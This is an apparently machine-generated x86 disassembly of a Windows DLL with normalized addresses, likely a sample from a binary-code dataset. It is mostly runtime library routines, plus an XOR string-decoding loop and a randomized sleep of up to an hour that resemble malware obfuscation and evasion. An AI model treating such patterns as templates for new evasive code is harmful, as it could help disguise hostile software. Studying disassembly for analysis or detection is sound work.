mov [ ebp - 0x5c ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0xc ] esi
je r-xdata
cmp [ ebp - 0x1c ] 0x8
jb r-xdata
mov edx [ ebp - 0x6c ]
mov ecx [ ebp - 0x68 ]
push edx
lea ebx [ ebp - 0x64 ]
lea edx [ ebp - 0x30 ]
call sub_1005a080
mov ebx [ ebp - 0x64 ]
test eax eax
je r-xdata
xor edx edx
xor eax eax
mov [ ebp - 0x40 ] 0x7
mov [ ebp - 0x44 ] esi
mov [ ebp - 0x54 ] dx
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] 0x2
mov edi [ edi + 0x10 ]
mov eax edi
lea edx [ eax + 0x2 ]
mov edi edi
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_1006591f
add esp 0x4
cmp ebx esi
je r-xdata
cmp ebx esi
je r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push edi
lea ecx [ ebp - 0x54 ]
call sub_100531b0
mov eax [ ebp + 0xc ]
lea ecx [ ebp - 0x54 ]
lea edi [ ebp - 0x64 ]
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x34 ] eax
call sub_10043a70
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x40 ] 0x8
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0xc
cmp [ ebp - 0x1c ] 0x8
jb r-xdata
mov edi [ ebp - 0x60 ]
mov eax ebx
call sub_10020290
push ebx
call sub_1006591f
add esp 0x4
cmp [ ebp - 0x1c ] 0x8
jb r-xdata
mov edi [ ebp - 0x60 ]
mov eax ebx
call sub_10020290
push ebx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x54 ]
push ecx
call sub_1006591f
add esp 0x4
xor eax eax
mov ecx [ ebp - 0x30 ]
push ecx
call sub_1006591f
add esp 0x4
mov eax 0x2
jmp r-xdata
mov eax [ ebp - 0x30 ]
push eax
call sub_1006591f
add esp 0x4
sub_10004360
push ebp
mov ebp esp
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
lea ebx [ ebp - 0x44 ]
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x44 ] eax
call sub_1006d500
mov ebx [ ebp + 0x10 ]
push ebx
lea eax [ ebp - 0x44 ]
push esi
push eax
call sub_10049250
lea edi [ ebp - 0x44 ]
call sub_1006d570
mov edi [ ebp - 0x38 ]
push esi
push ebx
push r--data
call sub_1003bee0
add esp 0x18
xor ebx ebx
mov ecx [ ebp - 0x38 ]
mov eax [ ecx + 0xc ]
test eax eax
je r-xdata
mov [ edi + 0x34 ] 0x0
jmp r-xdata
xor eax eax
mov ecx [ ecx + 0x8 ]
mov eax [ ecx + eax * 4 - 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x34 ]
mov eax r--data
cmp ecx 0x3
ja r-xdata
mov ebx 0x1
test ebx ebx
je r-xdata
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov ecx [ edi ]
mov edx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x30 ]
push edx
push ecx
push eax
push r--data
call sub_1003bee0
lea edx [ ebp - 0x34 ]
mov eax 0x1
add esp 0x14
mov [ edi + 0x68 ] edx
cmp [ ebp - 0x34 ] eax
jne r-xdata
jmp [ ecx * 4 + jump_table_10004594 ]
mov eax 0x1
jmp r-xdata
mov [ edi + 0x38 ] eax
lea eax [ ebp - 0x44 ]
push eax
lea esi [ ebp - 0x34 ]
call sub_10072e40
add esp 0x4
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax r--data
jmp r-xdata
mov edx [ ebp - 0x1c ]
push edx
call sub_10045960
add esp 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
push eax
call sub_10045960
add esp 0x4
jmp r-xdata
mov eax r--data
push eax
lea edx [ ebp - 0x44 ]
push edx
call sub_10060c20
lea eax [ ebp - 0x34 ]
push eax
lea ecx [ ebp - 0x44 ]
push ecx
call sub_1002ac40
add esp 0x10
test eax eax
je r-xdata
mov ebx 0x1
test ebx ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x34 ] 0x7
jne r-xdata
lea ecx [ ebp - 0x44 ]
push ecx
lea eax [ ebp - 0x34 ]
call sub_1006d7e0
add esp 0x4
test eax eax
je r-xdata
cmp [ edi + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp - 0x48 ]
cmp [ edx + 0x10 ] 0x0
je r-xdata
cmp [ edi + 0x34 ] 0x0
je r-xdata
mov [ eax ] 0x29
cmp [ edi + 0x34 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
lea eax [ ebp - 0x44 ]
call sub_1006f780
mov eax [ ebp - 0x40 ]
mov esi [ eax ]
cmp [ esi + 0x20 ] 0x0
jne r-xdata
cmp [ esi + 0x24 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x44 ]
push r--data
push ecx
call sub_1000ad70
add esp 0x8
mov [ esi + 0x20 ] eax
cmp [ esi + 0x28 ] 0x0
jne r-xdata
lea edx [ ebp - 0x44 ]
push r--data
push edx
call sub_1000ad70
add esp 0x8
mov [ esi + 0x24 ] eax
mov esi [ ebp - 0x38 ]
lea ecx [ esi + 0x14 ]
push ecx
lea edx [ ebp - 0x44 ]
push edx
call sub_10052120
lea eax [ esi + 0x8 ]
push eax
lea ecx [ ebp - 0x44 ]
push ecx
call sub_10052120
lea edx [ esi + 0x20 ]
push edx
lea eax [ ebp - 0x44 ]
push eax
call sub_10052120
lea ecx [ esi + 0x48 ]
push ecx
lea edx [ ebp - 0x44 ]
push edx
call sub_1004b8a0
lea eax [ ebp - 0x44 ]
push esi
push eax
call sub_10035fe0
lea ecx [ ebp - 0x44 ]
push ecx
call sub_1004d3d0
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x40 ]
add esp 0x2c
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x44 ]
push r--data
push eax
call sub_1000ad70
add esp 0x8
mov [ esi + 0x28 ] eax
sub_100045b0
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
add esp 0x4
sub_100045d2
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov edi [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp edi eax
ja r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x1c ] edi
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
or eax 0xffffffff
jmp r-xdata
pop esi
cmp eax ebx
jl r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi - 0x1 ] bl
setge al
sub eax 0x2
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1006b64d
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_1000469c
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
or eax 0xffffffff
pop ebp
retn
call sub_1004fd6f
mov [ eax ] 0x16
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
call sub_1001d849
or eax 0xffffffff
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_10012975
call sub_100045d2
add esp 0x18
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ esi ] 0x0
pop esi
pop ebp
retn
call sub_1004fd6f
mov [ eax ] 0x22
sub_10004720
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
call sub_1005f2b8
mov esi eax
add esp 0x4
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x8
call sub_1004fd6f
mov ecx [ eax ]
mov edx [ ebp + 0xc ]
mov [ edx ] ecx
mov eax esi
sub_10004749
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
call sub_10007cfe
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
call sub_1005150b
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop esi
leave
retn
sub eax 0x20
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
mov eax [ ebp - 0x8 ]
and eax 0xff
movsx eax [ ecx + eax * 2 ]
shr eax 0xf
and eax 0x1
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
call sub_1000dcee
movzx ecx [ ebp - 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x8 ]
test [ eax + ebx * 2 ] 0x2
je r-xdata
push ebx
call sub_10019314
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
mov al [ ebp - 0x8 ]
push 0x2
mov [ ebp + 0xc ] al
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push 0x200
push [ ebp - 0xc ]
push 0x0
call sub_10041dbf
add esp 0x24
test eax eax
jne r-xdata
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_1000485b
push 0x8
push r--data
call sub_10079bf0
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_10079c35
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_100048cd
push 0x10
push r--data
call sub_10079bf0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_1002ada5
and [ eax ] 0x0
call sub_1004fd6f
mov [ eax ] 0x9
call sub_1002ada5
and [ eax ] 0x0
call sub_1004fd6f
mov [ eax ] 0x9
call sub_1001d849
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_10079c35
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_100532a0
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_1003009f
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10004989
mov eax [ ebp - 0x1c ]
sub_100049a0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
call sub_100732e0
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
mov edx [ ebp + 0xc ]
mov [ ecx + eax * 4 ] edx
inc [ esi + 0x4 ]
pop esi
pop ebx
pop ebp
retn
sub_100049c2
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_10051dfe
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_1000977c
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
push esi
call sub_10022b5a
pop ecx
xor esi esi
push 0x0
push esi
call sub_100028b0
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_10004a3b
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1006605f
add esp 0xc
xor ebx ebx
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100492ed
int3
lea eax [ esi + 0x40 ]
cmp [ eax ] bl
je r-xdata
lea eax [ esi + 0x80 ]
cmp [ eax ] bl
pop esi
pop ebx
je r-xdata
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100039c3
add esp 0x14
pop ebp
retn
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100039c3
add esp 0x14
sub_10004ab0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_100836be
mov eax [ fs : 0x0 ]
push eax
sub esp 0x438
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x430 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x448 ]
mov [ fs : 0x0 ] eax
mov ebx [ GetProcessHeap@IAT ]
push 0x11
push 0x8
call ebx
mov edi [ HeapAlloc@IAT ]
push eax
call edi
mov esi eax
mov eax [ r--data ]
mov [ esi ] eax
mov ecx [ r--data ]
mov [ esi + 0x4 ] ecx
mov edx [ r--data ]
mov [ esi + 0x8 ] edx
mov ax [ r--data ]
mov [ esi + 0xc ] ax
mov cl [ r--data ]
push 0xc
push 0x8
mov [ esi + 0xe ] cl
call ebx
push eax
call edi
mov edx [ r--data ]
mov edi eax
mov [ edi ] edx
mov eax [ r--data ]
mov [ edi + 0x4 ] eax
mov ecx [ r--data ]
push 0x4
push 0x0
mov [ edi + 0x8 ] ecx
call ebx
push eax
call [ HeapAlloc@IAT ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x450 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov [ eax ] r--data
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x108 ] 0x0
jne r-xdata
push esi
push eax
call ebx
mov esi [ HeapFree@IAT ]
push eax
call esi
push edi
push 0x0
call ebx
push eax
call esi
mov eax 0x3f2
mov ecx [ esp + 0x448 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x430 ]
xor ecx esp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov [ esp + 0x450 ] 0xffffffff
test eax eax
jne r-xdata
lea ecx [ esp + 0x24 ]
push ecx
call sub_1003b1ca
mov eax [ esp + 0x28 ]
xor edx edx
mov ecx 0x36ee80
div ecx
add esp 0x4
push edx
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ eax + 0x110 ]
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
xor edi edi
mov [ esp + 0x14 ] edi
mov [ esp + 0x18 ] edi
mov [ esp + 0x1c ] edi
mov [ esp + 0x450 ] 0x1
mov eax [ rw-data ]
mov edx [ eax + 0x8 ]
sub edx [ eax + 0x4 ]
lea esi [ eax + 0x4 ]
sar edx 0x2
test edx edx
jne r-xdata
mov eax [ eax + 0x8 ]
mov ecx [ esi ]
mov edx eax
sub edx ecx
push sub_1005e150
sar edx 0x2
push edx
push eax
push ecx
call sub_10057f80
mov eax [ esi ]
mov ecx [ eax ]
mov cl [ ecx + 0x3e ]
add esp 0x10
xor cl cl
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x110 ]
push eax
call [ ReleaseMutex@IAT ]
mov ebx [ esp + 0x14 ]
mov ebx [ esp + 0x14 ]
mov edi ebx
cmp ebx [ esp + 0x18 ]
je r-xdata
lea edx [ esp + 0x14 ]
inc cl
push edx
call sub_100139d0
add esp 0x4
test eax eax
jne r-xdata
mov [ esp + 0x14 ] edi
mov [ esp + 0x18 ] edi
mov [ esp + 0x1c ] edi
mov edi [ esp + 0x18 ]
mov esi ebx
cmp ebx edi
je r-xdata
mov edi [ rw-data ]
xor eax eax
mov [ edi + 0x104 ] eax
mov [ edi + 0x10c ] eax
mov [ edi + 0x108 ] 0x1
call sub_100010b0
mov edx [ rw-data ]
mov eax [ edx + 0x110 ]
push eax
call [ ReleaseMutex@IAT ]
xor edi edi
jmp r-xdata
lea ecx [ ecx ]
push ebx
call sub_1006591f
add esp 0x4
xor edi edi
call sub_10054dd0
sub esi 0xffffff80
cmp esi edi
jne r-xdata
mov [ esp + 0x450 ] 0xffffffff
cmp ebx edi
je r-xdata
mov edx ecx
mov edx [ ecx ]
jmp r-xdata
mov esi [ esp + 0x30 ]
add esi 0x1c
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ecx [ ecx ]
mov ecx [ esp + 0x34 ]
add ecx 0x3c
cmp [ ecx + 0x14 ] esi
jb r-xdata
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov esi [ esi ]
mov ebx [ ebx + 0x7c ]
push ebx
mov ebx [ esp + 0x3c ]
mov ebx [ ebx + 0x78 ]
push ebx
mov ebx [ esp + 0x30 ]
movzx ebx [ ebx + 0x74 ]
push ebx
mov ebx [ esp + 0x38 ]
movzx ebx [ ebx + 0x38 ]
push ebx
push esi
push eax
call sub_10054e60
lea esi [ esp + 0x3c ]
mov [ esp + 0x450 ] 0x8
call sub_10054dd0
lea esi [ esp + 0x13c ]
mov [ esp + 0x450 ] 0x7
call sub_10054dd0
lea esi [ esp + 0x33c ]
mov [ esp + 0x450 ] 0x6
call sub_10054dd0
lea esi [ esp + 0x23c ]
mov [ esp + 0x450 ] 0x5
call sub_10054dd0
lea esi [ esp + 0xbc ]
mov [ esp + 0x450 ] 0x4
call sub_10054dd0
lea esi [ esp + 0x1bc ]
mov [ esp + 0x450 ] 0x3
call sub_10054dd0
lea esi [ esp + 0x2bc ]
mov [ esp + 0x450 ] 0x2
call sub_10054dd0
lea esi [ esp + 0x3bc ]
mov [ esp + 0x450 ] 0x1
call sub_10054dd0
sub edi 0xffffff80
cmp edi [ esp + 0x18 ]
jne r-xdata
mov eax [ eax ]
mov ecx edi
call sub_100019f0
lea eax [ esp + 0x3bc ]
push eax
call sub_1003d790
mov ebx eax
lea ecx [ esp + 0x2bc ]
push ecx
mov [ esp + 0x454 ] 0x2
call sub_1003d790
mov [ esp + 0x38 ] eax
lea edx [ esp + 0x1bc ]
push edx
mov [ esp + 0x454 ] 0x3
call sub_1003d790
mov [ esp + 0x28 ] eax
lea eax [ esp + 0xbc ]
push eax
mov [ esp + 0x454 ] 0x4
call sub_1003d790
mov esi eax
lea ecx [ esp + 0x23c ]
push ecx
mov [ esp + 0x454 ] 0x5
call sub_1003d790
mov [ esp + 0x34 ] eax
lea edx [ esp + 0x33c ]
push edx
mov [ esp + 0x454 ] 0x6
call sub_1003d790
mov [ esp + 0x2c ] eax
lea eax [ esp + 0x13c ]
push eax
mov [ esp + 0x454 ] 0x7
call sub_1003d790
mov [ esp + 0x30 ] eax
lea ecx [ esp + 0x3c ]
push ecx
mov [ esp + 0x454 ] 0x8
call sub_1003d790
lea ecx [ esi + 0x58 ]
mov esi 0x8
mov [ esp + 0x450 ] 0x9
cmp [ ecx + 0x14 ] esi
jb r-xdata
mov ebx [ esp + 0x14 ]
sub_10004f00
push ebp
mov ebp esp
push ecx
xor eax eax
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push eax
add edx 0x40
mov [ esi ] cx
push edx
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_10019180
mov eax esi
mov esp ebp
pop ebp
retn
sub_10004f2c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
sub esi [ ebp + 0x10 ]
sar eax 0x1
sar esi 0x1
cmp esi eax
ja r-xdata
mov eax esi
pop esi
pop ebp
retn
lea ecx [ esi + esi ]
push ecx
push [ ebp + 0x10 ]
add eax eax
push eax
push [ ebp + 0x8 ]
call sub_1006581d
add esp 0x10
sub_10004f60
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1000a77b
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_10005000
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
mov ecx [ rw-data ]
fld [ r--data ]
fsubr st1
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fld [ r--data ]
fcom st1
fnstsw ax
fstp st1
test ah 0x41
jne r-xdata
fld st1
fsub [ r--data ]
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st0
fldz
fstp [ ecx + 0x118 ]
pop ebp
retn 0x4
fld st1
fsub [ r--data ]
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st0
fld [ r--data ]
fstp [ ecx + 0x118 ]
pop ebp
retn 0x4
fxch st1
fsub [ r--data ]
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fcompp
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st0
fld1
fstp [ ecx + 0x118 ]
pop ebp
retn 0x4
pop ebp
retn 0x4
fld [ r--data ]
fstp [ ecx + 0x118 ]
sub_100050e0
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10005130
mov [ esi ] r--data
push ebx
xor ebx ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x34 ] 0xf
mov [ esi + 0x30 ] ebx
mov [ esi + 0x20 ] bl
mov [ esi + 0x384 ] ebx
mov [ esi + 0x39c ] 0x1
mov [ esi + 0x3a0 ] ebx
mov [ esi + 0x3a4 ] ebx
mov [ esi + 0x3a8 ] ebx
mov [ esi + 0x3b0 ] ebx
mov [ esi + 0x3b4 ] ebx
mov [ esi + 0x3b8 ] ebx
mov [ esi + 0x3c0 ] ebx
mov [ esi + 0x3c4 ] ebx
mov [ esi + 0x3c8 ] ebx
mov [ esi + 0x3d0 ] ebx
call [ GetCurrentThreadId@IAT ]
push rw-data
mov [ esi + 0x374 ] eax
mov [ esi + 0x37c ] 0x1
call [ InterlockedIncrement@IAT ]
mov [ esi + 0x378 ] eax
mov [ esi + 0x380 ] ebx
mov eax esi
pop ebx
retn
sub_100051e8
mov edi edi
push ebp
mov ebp esp
push ecx
fwait
fnstcw [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and ecx [ ebp + 0xc ]
not eax
and ax [ ebp - 0x4 ]
or ax cx
movzx eax ax
mov [ ebp + 0xc ] eax
fldcw [ ebp + 0xc ]
movsx eax [ ebp - 0x4 ]
leave
retn
sub_10005213
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
lea eax [ ebp - 0x10 ]
push edi
push eax
mov ebx ecx
call sub_10045e45
mov esi eax
lea edi [ ebx + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
movsd [ edi ] [ esi ]
call sub_1000a66f
pop edi
pop esi
mov [ ebx + 0x18 ] eax
mov [ ebx + 0x1c ] edx
pop ebx
leave
retn 0x4
sub_10005245
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1006a508
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_1001116c
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_100052b0
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10005300
push ebp
mov ebp esp
push 0xffffffff
push sub_100824e8
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
call j_sub_100680ab
test al al
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax + 0x38 ]
test eax eax
je r-xdata
mov ecx [ esi ]
call sub_10060a10
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
sub_1000536e
push 0x4c
mov eax sub_1007ff2b
call sub_1001bb6b
mov eax [ ebp + 0x20 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebp + 0x24 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
mov esi ecx
mov ecx [ ebp + 0x28 ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x50 ] ecx
push eax
mov ecx esi
mov [ ebp - 0x58 ] ebx
